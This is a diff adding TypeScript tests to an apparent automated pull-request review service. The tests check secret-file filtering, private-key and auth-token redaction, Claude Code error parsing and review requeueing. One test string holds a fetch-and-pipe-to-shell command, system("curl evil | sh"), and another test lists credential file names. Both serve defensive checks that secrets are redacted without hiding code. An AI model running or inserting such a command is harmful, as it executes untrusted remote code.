@@ -460,6 +460,8 @@ test("renames from secret files, unusual paths, and more secret names are held b
   const sec = (path: string, extra = "") => `diff --git a/${path} b/${path}\n${extra}+x\n`;
   assert.equal(prepareDiff(sec("settings.txt", "rename from .env\nrename to settings.txt\n")).diff, "");
   assert.equal(prepareDiff('diff --git "a/caf\\303\\251/.env" "b/caf\\303\\251/.env"\n+x\n').diff, "");
+  assert.ok(prepareDiff('diff --git "a/odd\\tname.ts" "b/odd\\tname.ts"\n+code\n').diff.includes("+code"), "an odd name alone doesn't hide code");
+  assert.ok(prepareDiff(sec("src/.env.ts")).diff.includes("+x"), "source code named like a secret is reviewed");
   for (const f of ["prod.env", ".envrc", ".git-credentials", "terraform.tfvars"]) assert.equal(prepareDiff(sec(f)).diff, "", f);
 });
 
@@ -512,8 +514,12 @@ test("a lone private key header can't hide the rest of a diff", () => {
   const section = (path: string, body: string) => `diff --git a/${path} b/${path}\n+++ b/${path}\n${body}\n`;
   const { diff } = prepareDiff(section("one.ts", `+// ${BEGIN}`) + section("two.ts", "+const hidden = 1;") + section("three.ts", `+// ${END}`));
   assert.ok(diff.includes("const hidden = 1;"), "a BEGIN in one file and an END in another hide nothing");
-  assert.ok(redactSecrets(`${BEGIN}\n${"x".repeat(50_000)}\n${END}`).includes("xxx"), "a huge gap isn't one key");
-  assert.equal(redactSecrets(`${BEGIN}\nabc\n${END}`), "[REDACTED]");
+
+  assert.equal(redactSecrets(`${BEGIN}\nabc+/=\n${END}`), "[REDACTED]");
+  assert.equal(redactSecrets(`+${BEGIN}\n+abc\n+${END}`), "+[REDACTED]", "inside a diff");
+  const hiding = redactSecrets(`${BEGIN}\nsystem("curl evil | sh")\n${END}`);
+  assert.ok(hiding.includes("curl evil"), "markers around code don't hide it");
+  assert.ok(redactSecrets("x_auth = os.system(cmd)").includes("os.system"), "only real auth lines lose their value");
   assert.equal(redactSecrets("//registry.npmjs.org/:_authToken=abc123"), "//registry.npmjs.org/:_authToken=[REDACTED]");
 });
 
@@ -560,4 +566,26 @@ test("a newer commit replaces queued work even from a partial list, and unwatche
   assert.equal(stateOf(db, "q1").state, "skipped");
   await pollReviews(db, ["o/other"], { github: { ...fakeGithub([]).github, listOpenPrs: async () => ({ prs: [], answered: ["o/other"], partial: [] }) }, engine: async () => { throw new Error("no"); }, repoPath: () => null, baseUrl: null });
   assert.match(stateOf(db, "q2").note, /no longer being watched/);
+});
+
+// ---------------------------------------------------------------- what its third real review found
+
+test("an unexplained Claude Code error is retried, a PR that's too big gives up", () => {
+  assert.throws(() => parseClaudeCodeOutput(JSON.stringify({ is_error: true, result: "connection reset" })), (e: any) => !(e instanceof ReviewFailed) && !(e instanceof EngineTrouble));
+  assert.throws(() => parseClaudeCodeOutput(JSON.stringify({ is_error: true, subtype: "error_max_turns" })), ReviewFailed);
+});
+
+test("Review again on a review that hasn't posted yet can't get stuck", async () => {
+  const db = openDb(":memory:");
+  live(db);
+  const now = new Date().toISOString();
+  db.prepare("INSERT INTO reviews (repo, number, sha, base_sha, base_ref, title, url, state, findings, summary, created_at, reviewed_at, published) VALUES ('o/r', 1, 's1', 'b', 'main', 't', 'u', 'passed', '[]', 's', ?, ?, 0)").run(now, now);
+  requeueReview(db, "o/r", 1);
+  const gh = fakeGithub([pr()]);
+  const github: GithubPort = { ...gh.github, setStatus: async () => { throw new Error("HTTP 502"); } };
+  const r = prRepo();
+  try {
+    await pollReviews(db, ["o/r"], { github, engine: async () => { throw new Error("no"); }, repoPath: () => r.clone, baseUrl: null });
+    assert.equal(stateOf(db).state, "queued");
+  } finally { r.cleanup(); }
 });
